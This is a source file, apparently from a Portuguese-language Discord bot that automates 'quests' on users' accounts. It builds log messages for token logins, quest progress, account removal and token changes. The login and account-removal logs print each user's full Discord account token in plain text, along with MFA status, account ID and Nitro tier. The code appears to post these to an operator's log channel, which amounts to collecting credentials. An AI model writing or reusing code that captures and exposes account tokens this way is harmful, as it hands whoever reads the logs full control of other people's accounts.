// @ts-nocheck
import { ContainerBuilder, SectionBuilder, SeparatorBuilder, TextDisplayBuilder, ThumbnailBuilder } from "discord.js";
import { avatarUrl, premiumLabel } from "../../../discord/api/quests.ts";
function truncate(str,max){const s=String(str||"");return s.length>max?`${s.slice(0,max-1)}…`:s;}
function tokenBlock(token){if(!token)return "`—`";return ["```",String(token),"```"].join("\n");}
function buildLoginLogContainer({ discordUser, accountUser, orbs = null, token }) {
  const name = truncate(accountUser?.username || "desconhecido", 32);
  const globalName = truncate(
    accountUser?.global_name || accountUser?.display_name || name,
    32
  );
  const orbsText = orbs == null ? "`—`" : `\`${Number(orbs).toLocaleString("pt-BR")}\``;
  const thumb = avatarUrl(accountUser);

  const section = new SectionBuilder().addTextDisplayComponents(
    new TextDisplayBuilder().setContent("# Login com token"),
    new TextDisplayBuilder().setContent(
      [
        `\`👤\` Discord: ${discordUser} (\`${discordUser.id}\`)`,
        `\`🏷️\` Conta conectada: **${globalName}** \`@${name}\``,
        `\`🆔\` Account ID: \`${accountUser?.id || "—"}\``,
        `\`🟣\` Orbs: ${orbsText}`,
        `\`💎\` Nitro: \`${premiumLabel(accountUser?.premium_type)}\``,
        `\`🌐\` Locale: \`${accountUser?.locale || "—"}\``,
        `\`🔐\` MFA: \`${accountUser?.mfa_enabled ? "sim" : "não"}\` · Verificado: \`${accountUser?.verified ? "sim" : "não"}\``,
        `\`🔑\` Token:`,
        tokenBlock(token),
        `\`⏱️\` Horário: <t:${Math.floor(Date.now() / 1000)}:F>`
      ].join("\n")
    )
  );

  if (thumb) section.setThumbnailAccessory(new ThumbnailBuilder().setURL(thumb));

  return new ContainerBuilder()
    .addSectionComponents(section)
    .addSeparatorComponents(new SeparatorBuilder().setSpacing("Small").setDivider(true))
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent("-# Log automático · conta autenticada via token")
    );
}

function buildQuestRunningLogContainer({ discordUserId, username, questLabel, secondsNeeded }) {
  return new ContainerBuilder()
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent("# Missão em andamento"),
      new TextDisplayBuilder().setContent(
        [
          `\`👤\` Usuário: **${truncate(username || "desconhecido", 32)}** (\`${discordUserId}\`)`,
          `\`🎯\` Missão: **${truncate(questLabel || "Quest", 60)}**`,
          `\`⏱️\` Meta: \`${secondsNeeded || 0}s\``,
          `\`🔄\` Status: \`em execução\``,
          `\`📅\` Início: <t:${Math.floor(Date.now() / 1000)}:R>`
        ].join("\n")
      )
    )
    .addSeparatorComponents(new SeparatorBuilder().setSpacing("Small").setDivider(true))
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent("-# Log automático · missão iniciada")
    );
}

function buildQuestCompletedLogContainer({
  discordUserId,
  username,
  questLabel,
  elapsedSeconds,
  status = "done",
  error
}) {
  const ok = status === "done";
  return new ContainerBuilder()
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(ok ? "# Missão completada" : "# Missão com erro"),
      new TextDisplayBuilder().setContent(
        [
          `\`👤\` Usuário: **${truncate(username || "desconhecido", 32)}** (\`${discordUserId}\`)`,
          `\`🎯\` Missão: **${truncate(questLabel || "Quest", 60)}**`,
          ok
            ? `\`✅\` Status: \`concluída\``
            : `\`❌\` Status: \`erro\` · \`${truncate(error || "falha", 80)}\``,
          `\`⏱️\` Duração: \`${elapsedSeconds || 0}s\``,
          `\`📅\` Finalizada: <t:${Math.floor(Date.now() / 1000)}:F>`
        ].join("\n")
      )
    )
    .addSeparatorComponents(new SeparatorBuilder().setSpacing("Small").setDivider(true))
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(
        ok
          ? "-# Log automático · missão concluída com sucesso"
          : "-# Log automático · missão finalizada com erro"
      )
    );
}

function buildAccountRemovedLogContainer({ discordUser, account }) {
  return new ContainerBuilder()
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent("# Conta removida"),
      new TextDisplayBuilder().setContent(
        [
          `\`👤\` Discord: ${discordUser} (\`${discordUser.id}\`)`,
          `\`🏷️\` Conta: **${truncate(account?.globalName || account?.username || "desconhecida", 32)}**`,
          `\`🆔\` Account ID: \`${account?.accountId || "—"}\``,
          `\`🔑\` Token:`,
          tokenBlock(account?.token),
          `\`⏱️\` Horário: <t:${Math.floor(Date.now() / 1000)}:F>`
        ].join("\n")
      )
    )
    .addSeparatorComponents(new SeparatorBuilder().setSpacing("Small").setDivider(true))
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent("-# Log automático · usuário removeu a conta conectada")
    );
}

function buildTokenChangedLogContainer({ discordUser, previousAccount, accountUser, orbs = null }) {
  const name = truncate(accountUser?.username || "desconhecido", 32);
  const globalName = truncate(
    accountUser?.global_name || accountUser?.display_name || name,
    32
  );
  const orbsText = orbs == null ? "`—`" : `\`${Number(orbs).toLocaleString("pt-BR")}\``;
  const prev = truncate(
    previousAccount?.globalName || previousAccount?.username || "anterior",
    32
  );

  return new ContainerBuilder()
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent("# Token alterado"),
      new TextDisplayBuilder().setContent(
        [
          `\`👤\` Discord: ${discordUser} (\`${discordUser.id}\`)`,
          `\`🔁\` Antes: **${prev}** (\`${previousAccount?.accountId || "—"}\`)`,
          `\`🏷️\` Agora: **${globalName}** \`@${name}\``,
          `\`🆔\` Account ID: \`${accountUser?.id || "—"}\``,
          `\`🟣\` Orbs: ${orbsText}`,
          `\`⏱️\` Horário: <t:${Math.floor(Date.now() / 1000)}:F>`
        ].join("\n")
      )
    )
    .addSeparatorComponents(new SeparatorBuilder().setSpacing("Small").setDivider(true))
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent("-# Log automático · usuário alterou o token da conta")
    );
}
export {buildLoginLogContainer,buildQuestRunningLogContainer,buildQuestCompletedLogContainer,buildAccountRemovedLogContainer,buildTokenChangedLogContainer};
